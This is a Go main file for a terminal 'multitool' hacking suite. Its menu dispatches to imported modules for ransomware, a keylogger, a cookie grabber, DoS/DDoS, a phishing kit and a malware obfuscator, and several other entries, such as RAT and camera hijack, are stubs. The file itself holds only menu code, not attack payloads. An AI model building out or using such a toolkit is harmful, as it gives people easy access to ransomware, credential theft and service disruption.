package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"programa/scripts/cookies"
	"programa/scripts/dos"
	"programa/scripts/garbageinjector"
	"programa/scripts/imganalysis"
	"programa/scripts/ipscanner"
	"programa/scripts/keylogger"
	"programa/scripts/malware_obfuscator"
	"programa/scripts/nethunter"
	"programa/scripts/osint"
	"programa/scripts/pcutilities"
	"programa/scripts/portscanner"
	"programa/scripts/ransomware"
	"programa/scripts/zphisher"
	"programa/utils"
)

func Menu() {
	leftPad := "            "
	gap := "      "
	intro := "The only multitool 🛠  you will ever need - v1.0.0 - https://github.com/Edgar-GIT"
	title := "TOOLS"

	col1 := []string{
		"[1]  - IP / Port Scanner",
		"[2]  - OSINT",
		"[3]  - PC Utilities",
		"[4]  - Password Cracker",
		"[5]  - DoS / DDoS",
		"[6]  - Image Analysis",
		"[7]  - History Menu",
		"[8]  - NetHunter",
		"[9]  - Cookie Grabber",
		"[10] - Car Information",
	}
	col2 := []string{
		"[11] - Phone Information",
		"[12] - Blub Blub",
		"[13] - RAT",
		"[14] - Ransomware",
		"[15] - Keylogger",
		"[16] - Garbage Injector",
		"[17] - Live Camera Hijack",
		"[18] - Evil QR",
		"[19] - Web Inspection",
		"[20] - Malware Obfuscator",
	}

	boxWidth := 35
	boxes := [][]string{
		utils.MakeBoxLines(col1, boxWidth),
		utils.MakeBoxLines(col2, boxWidth),
	}

	blue := [3]int{70, 92, 250}
	indigo := [3]int{94, 88, 255}

	totalWidth := (boxWidth + 4) * 2
	titlePadding := (totalWidth - len(title)) / 2

	fmt.Printf("\n%s%s%s\n\n", leftPad, utils.RGBText(255, 210, 60, intro), utils.Reset)
	fmt.Printf("%s%s%s\n\n", leftPad, utils.RGBText(97, 114, 255, strings.Repeat(" ", titlePadding)+title), utils.Reset)

	for i := range boxes[0] {
		fmt.Printf("%s%s%s%s%s\n",
			leftPad,
			utils.RGBText(blue[0], blue[1], blue[2], boxes[0][i]),
			gap,
			utils.RGBText(indigo[0], indigo[1], indigo[2], boxes[1][i]),
			utils.Reset,
		)
	}

	fmt.Println()
}

func ScannerMenu() {
	reader := bufio.NewReader(os.Stdin)

	for {
		utils.ClearTerminal()
		fmt.Printf("\n%s============ SCANNER MENU ============%s\n\n", utils.Blue, utils.Reset)

		fmt.Printf("%s[1]  - IP Scanner%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[2]  - Port Scanner%s\n", utils.Green, utils.Reset)
		utils.PrintReturnOption("3")

		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
		input, readErr := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if readErr != nil && input == "" {
			return
		}

		switch input {
		case "1":
			ipscanner.IpScanner()
		case "2":
			portscanner.PortScanner()
		case "3":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		}
	}
}

func HistoryMenu() {
	reader := bufio.NewReader(os.Stdin)

	for {
		utils.ClearTerminal()
		fmt.Printf("\n%s============ HISTORY MENU ============%s\n\n", utils.Blue, utils.Reset)

		fmt.Printf("%s[1]  - View IP Scan Results%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[2]  - View Port Scan Results%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[3]  - OSINT History / Statistics%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[4]  - View Image Analysis History%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[5]  - PC system reports (saved exports)%s\n", utils.Green, utils.Reset)
		utils.PrintReturnOption("6")

		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
		input, readErr := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if readErr != nil && input == "" {
			return
		}

		switch input {
		case "1":
			ipscanner.ViewScanResults()
		case "2":
			portscanner.ViewPortScanResults()
		case "3":
			osint.ViewOSINTStats()
			utils.WaitForEnter(reader)
		case "4":
			imganalysis.ViewImageAnalysisHistory()
		case "5":
			pcutilities.ViewPCReportHistory()
		case "6":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		}
	}
}

func main() {
	if err := os.MkdirAll("target", 0755); err != nil {
		fmt.Printf("%s[!] Failed to create target directory: %v%s\n", utils.Red, err, utils.Reset)
	}

	reader := bufio.NewReader(os.Stdin)

	for {
		utils.ClearTerminal()
		utils.Banner()
		Menu()

		fmt.Printf("%sChoose a Tool (write 0 to exit): %s", utils.Green, utils.Reset)
		input, readErr := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if readErr != nil && input == "" {
			fmt.Printf("%sLeaving... Stay Ethical!!%s\n", utils.Yellow, utils.Reset)
			return
		}

		if input == "0" {
			fmt.Printf("%sLeaving... Stay Ethical!!%s\n", utils.Yellow, utils.Reset)
			os.Exit(0)
		}

		switch input {
		case "1":
			ScannerMenu()
		case "2":
			osint.OSINTToolkit()
		case "3":
			pcutilities.PCUtilitiesMenu()
		case "4":
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("\n%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		case "5":
			dos.DoSMenu()
		case "6":
			imganalysis.ImageAnalysis()
		case "7":
			HistoryMenu()
		case "8":
			nethunter.NetHunter()
		case "9":
			cookies.CookieToolMenu()
		case "10":
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("\n%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		case "11":
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("\n%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		case "12":
			zphisher.Launch()
		case "13":
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("\n%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		case "14":
			ransomware.LaunchRansomware()
		case "15":
			keylogger.LaunchKeylogger()
		case "16":
			garbageinjector.GarbageInjector()
		case "17":
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("\n%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		case "18":
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("\n%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		case "19":
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("\n%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		case "20":
			malware_obfuscator.MalwareObfuscatorMenu()
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			fmt.Printf("\n%sPress Enter to continue...%s", utils.Green, utils.Reset)
			reader.ReadString('\n')
		}
	}
}
